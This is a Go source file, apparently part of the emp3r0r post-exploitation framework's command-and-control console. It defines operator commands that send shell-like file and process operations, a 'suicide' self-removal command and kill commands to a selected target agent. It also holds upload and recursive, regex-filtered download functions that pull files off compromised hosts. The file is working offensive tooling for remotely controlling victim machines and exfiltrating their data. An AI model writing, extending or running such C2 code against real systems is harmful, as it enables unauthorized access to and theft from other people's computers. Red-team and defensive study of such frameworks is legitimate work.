//go:build linux
// +build linux

package cc

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

func ls(cmd *cobra.Command, args []string) {
	dst, err := cmd.Flags().GetString("path")
	if err != nil {
		CliPrintError("ls: %v", err)
		return
	}
	if dst == "" {
		dst = "."
	}

	FSCmdDst("ls", dst)
}

func pwd(cmd *cobra.Command, args []string) {
	executeCmd("pwd")
}

func cd(cmd *cobra.Command, args []string) {
	dst, err := cmd.Flags().GetString("path")
	if err != nil {
		CliPrintError("cd: %v", err)
		return
	}
	if dst == "" {
		dst = "/"
		return
	}
	FSCmdDst("cd", dst)
}

func cp(cmd *cobra.Command, args []string) {
	src, err := cmd.Flags().GetString("src")
	if err != nil {
		CliPrintError("cp: %v", err)
		return
	}
	dst, err := cmd.Flags().GetString("dst")
	if err != nil {
		CliPrintError("cp: %v", err)
		return
	}
	if src == "" || dst == "" {
		CliPrintError("cp: src and dst are required")
		return
	}

	FSCmdSrcDst("cp", src, dst)
}

func rm(cmd *cobra.Command, args []string) {
	dst, err := cmd.Flags().GetString("path")
	if err != nil {
		CliPrintError("rm: %v", err)
		return
	}
	if dst == "" {
		CliPrintError("rm: path is required")
		return
	}
	FSCmdDst("rm", dst)
}

func mkdir(cmd *cobra.Command, args []string) {
	dst, err := cmd.Flags().GetString("path")
	if err != nil {
		CliPrintError("mkdir: %v", err)
		return
	}
	if dst == "" {
		CliPrintError("mkdir: path is required")
		return
	}
	FSCmdDst("mkdir", dst)
}

func mv(cmd *cobra.Command, args []string) {
	src, err := cmd.Flags().GetString("src")
	if err != nil {
		CliPrintError("mv: %v", err)
		return
	}
	dst, err := cmd.Flags().GetString("dst")
	if err != nil {
		CliPrintError("mv: %v", err)
		return
	}
	if src == "" || dst == "" {
		CliPrintError("mv: src and dst are required")
		return
	}
	FSCmdSrcDst("mv", src, dst)
}

func ps(cmd *cobra.Command, args []string) {
	executeCmd("ps")
}

func net_helper(cmd *cobra.Command, args []string) {
	executeCmd("net_helper")
}

func suicide(cmd *cobra.Command, args []string) {
	executeCmd("suicide")
}

func kill(cmd *cobra.Command, args []string) {
	pid, err := cmd.Flags().GetInt("pid")
	if err != nil {
		CliPrintError("kill: %v", err)
		return
	}
	if pid == 0 {
		CliPrintError("kill: pid is required")
		return
	}
	executeCmd(fmt.Sprintf("kill --pid %d", pid))
}

func FSCmdDst(cmd, dst string) {
	executeCmd(fmt.Sprintf("%s --dst '%s'", cmd, dst))
}

func FSCmdSrcDst(cmd, src, dst string) {
	executeCmd(fmt.Sprintf("%s --src '%s' --dst '%s'", cmd, src, dst))
}

func UploadToAgent(cmd *cobra.Command, args []string) {
	target := SelectCurrentTarget()
	if target == nil {
		CliPrintError("You have to select a target first")
		return
	}

	src, err := cmd.Flags().GetString("src")
	if err != nil {
		CliPrintError("UploadToAgent: %v", err)
		return
	}
	dst, err := cmd.Flags().GetString("dst")
	if err != nil {
		CliPrintError("UploadToAgent: %v", err)
		return
	}

	if src == "" || dst == "" {
		CliPrintError(cmd.UsageString())
		return
	}

	if err := PutFile(src, dst, target); err != nil {
		CliPrintError("Cannot put %s: %v", src, err)
	}
}

func DownloadFromAgent(cmd *cobra.Command, args []string) {
	target := SelectCurrentTarget()
	if target == nil {
		CliPrintError("You have to select a target first")
		return
	}
	// parse command-line arguments using pflag
	isRecursive, _ := cmd.Flags().GetBool("recursive")
	filter, _ := cmd.Flags().GetString("regex")

	file_path, err := cmd.Flags().GetString("file_path")
	if err != nil {
		CliPrintError("download: %v", err)
		return
	}
	if file_path == "" {
		CliPrintError("download: file_path is required")
		return
	}

	if isRecursive {
		cmd_id := uuid.NewString()
		err = SendCmdToCurrentTarget(fmt.Sprintf("get --file_path %s --filter %s --offset 0 --token %s", file_path, strconv.Quote(filter), uuid.NewString()), cmd_id)
		if err != nil {
			CliPrintError("Cannot get %v+: %v", args, err)
			return
		}
		CliPrintInfo("Waiting for response from agent %s", target.Tag)
		var result string
		var exists bool
		for i := 0; i < 10; i++ {
			result, exists = CmdResults[cmd_id]
			if exists {
				CliPrintInfo("Got file list from %s", target.Tag)
				CmdResultsMutex.Lock()
				delete(CmdResults, cmd_id)
				CmdResultsMutex.Unlock()
				if result == "" {
					CliPrintError("Cannot get %s: empty file list in directory", file_path)
				}
				break
			}
			time.Sleep(1 * time.Second)
		}
		CliPrintDebug("Got file list: %s", result)

		// download files
		files := strings.Split(result, "\n")
		failed_files := []string{}
		defer func() {
			CliPrint("Checking %d downloads...", len(files))
			// check if downloads are successful
			for _, file := range files {
				// filenames
				_, target_file, tempname, lock := generateGetFilePaths(file)
				// check if download is successful
				if util.IsFileExist(tempname) || util.IsFileExist(lock) || !util.IsFileExist(target_file) {
					CliPrintWarning("%s: download seems unsuccessful", file)
					failed_files = append(failed_files, file)
				}
			}
			if len(failed_files) > 0 {
				CliPrintError("Failed to download %d files: %s", len(failed_files), strings.Join(failed_files, ", "))
			} else {
				CliPrintSuccess("All %d files downloaded successfully", len(files))
			}
		}()
		CliPrintInfo("Downloading %d files", len(files))
		for n, file := range files {
			ftpSh, err := GetFile(file, target)
			if err != nil {
				CliPrintWarning("Cannot get %s: %v", file, err)
				continue
			}

			CliPrint("Downloading %d/%d: %s", n+1, len(files), file)

			// wait for file to be downloaded
			for {
				if sh, ok := FTPStreams[file]; ok {
					if ftpSh.Token == sh.Token {
						util.TakeABlink()
						continue
					}
				}
				break
			}
		}
	} else {
		if _, err := GetFile(file_path, target); err != nil {
			CliPrintError("Cannot get %s: %v", strconv.Quote(file_path), err)
		}
	}
}

func executeCmd(cmd string) {
	err := SendCmdToCurrentTarget(cmd, "")
	if err != nil {
		CliPrintError("%s failed: %v", cmd, err)
	}
}
